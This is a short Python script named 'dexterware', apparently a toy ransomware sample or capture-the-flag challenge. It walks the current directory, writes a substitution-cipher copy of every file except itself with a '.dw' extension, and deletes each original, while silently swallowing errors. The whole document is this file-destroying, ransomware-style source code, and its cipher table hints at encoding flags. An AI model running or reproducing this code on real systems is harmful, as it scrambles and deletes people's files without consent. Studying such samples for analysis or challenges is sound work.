#!/usr/bin/env python3

import sys
import traceback

from os import scandir, path, remove, getcwd

DEBUG = False

# Yup, Dexter is so smart that he invented he's own alphabet and decimal system
dexter_alphabet = {
    'a' : 'b',
    'b' : 'g',
    'c' : 'q',
    'd' : 'u',
    'e' : 'r',
    'f' : 'j',
    'g' : 'k',
    'h' : 'p',
    'i' : 'w',
    'j' : 'e',
    'k' : 'd',
    'l' : 'z',
    'm' : 'm',
    'n' : 'o',
    'o' : 'a',
    'p' : 'f',
    'q' : 'c',
    'r' : 'i',
    's' : 'v',
    't' : 'n',
    'u' : 'y',
    'v' : 't',
    'w' : 'x',
    'x' : 'h',
    'y' : 'l',
    'z' : 's',
    'A' : 'B',
    'B' : 'G',
    'C' : 'Q',
    'D' : 'U',
    'E' : 'R',
    'F' : 'J',
    'G' : 'K',
    'H' : 'P',
    'I' : 'W',
    'J' : 'E',
    'K' : 'D',
    'L' : 'Z',
    'M' : 'M',
    'N' : 'O',
    'O' : 'A',
    'P' : 'F',
    'Q' : 'C',
    'R' : 'I',
    'S' : 'V',
    'T' : 'N',
    'U' : 'Y',
    'V' : 'T',
    'W' : 'X',
    'X' : 'H',
    'Y' : 'L',
    'Z' : 'S',
    '0' : '5',
    '1' : '3',
    '2' : '7',
    '3' : '1',
    '4' : '0',
    '5' : '2',
    '6' : '4',
    '7' : '9',
    '8' : '6',
    '9' : '8',
    '_' : '£',
    '{' : '<',
    '}' : '>'
}


def boop_beep_boop(file_name):
    new_file_name = "".join([file_name, ".dw"])
    with open(file_name, "r") as fin, open(new_file_name, "w") as fout:
        for line in fin:
            out = "".join(dexter_alphabet.get(c, c) for c in line.rstrip("\r\n"))
            fout.write(out + '\n')

    try:
        fsize1, fsize2 = path.getsize(file_name), path.getsize(new_file_name)

        return fsize1 <= fsize2
    except OSError as _:
        if DEBUG:
            traceback.print_exc()
        
        return False


def dexterware():
    my_self = lambda n: n == sys.argv[0]
    try:
        with scandir(getcwd()) as fd_it:
            for entry in fd_it:
                if entry.is_file() and not my_self(entry.name):
                    has_booped = boop_beep_boop(entry.name)
                    try:
                        if has_booped:
                            remove(entry.path)
                    except OSError as _:
                        if DEBUG:
                            traceback.print_exc()
    except Exception as _:
        if DEBUG:
            traceback.print_exc()

                
if __name__ == "__main__":
    if sys.version_info < (3, 6, 0):
        print("Puh rum pum pow!\nSlow down!\nYou need a newer version of Python(>= 3.6.0)")
        sys.exit(0)
        
    dexterware()
